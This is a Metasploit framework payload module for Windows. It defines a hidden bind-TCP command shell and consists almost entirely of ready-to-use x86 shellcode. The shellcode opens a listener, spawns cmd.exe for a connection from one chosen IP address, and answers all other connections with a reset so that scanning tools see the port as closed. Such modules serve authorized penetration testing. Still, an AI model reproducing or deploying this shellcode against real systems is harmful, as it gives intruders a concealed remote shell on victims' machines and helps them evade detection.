##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_hidden_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Hidden Bind TCP Inline',
      'Description'   => 'Listen for a connection from certain IP and spawn a command shell.
                          The shellcode will reply with a RST packet if the connection is not
                          comming from the IP defined in AHOST. This way the socket will appear
                          as "closed" helping us to keep our shellcode hidden from scanning tools.',
      'Author'        =>
        [
          'vlad902',    # original payload module (single_shell_bind_tcp)
          'sd',         # original payload module (single_shell_bind_tcp)
          'Borja Merino <bmerinofe[at]gmail.com>'	# Add Hidden ACL functionality
        ],
      'License'       => MSF_LICENSE,
      'References'    => ['URL', 'http://www.youtube.com/watch?v=xYBuaVNQjGA&hd=1'],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindHiddenTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 200, 'n' ],
              'AHOST'    => [ 262, 'ADDR' ],
              'EXITFUNC' => [ 364, 'V' ],
            },
          'Payload' =>
      "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b" +
      "\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0" +
      "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57" +
      "\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01" +
      "\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b" +
      "\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4" +
      "\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" +
      "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24" +
      "\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d" +
      "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07" +
      "\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00" +
      "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff" +
      "\xd5\x97\x31\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57" +
      "\x68\xc2\xdb\x37\x67\xff\xd5\x6a\x01\x54\x68\x02\x30\x00\x00\x68" +
      "\xff\xff\x00\x00\x57\x68\xf1\xa2\x77\x29\xff\xd5\x53\x57\x68\xb7" +
      "\xe9\x38\xff\xff\xd5\x53\xe8\x17\x00\x00\x00\x8b\x44\x24\x04\x8b" +
      "\x40\x04\x8b\x40\x04\x2d\xc0\xa8\x01\x21\x74\x03\x31\xc0\x40\xc2" +
      "\x20\x00\x53\x53\x57\x68\x94\xac\xbe\x33\xff\xd5\x83\xf8\xff\x74" +
      "\xd4\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89" +
      "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24" +
      "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46" +
      "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e" +
      "\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a" +
      "\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05" +
      "\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
        }
      ))
  end

end
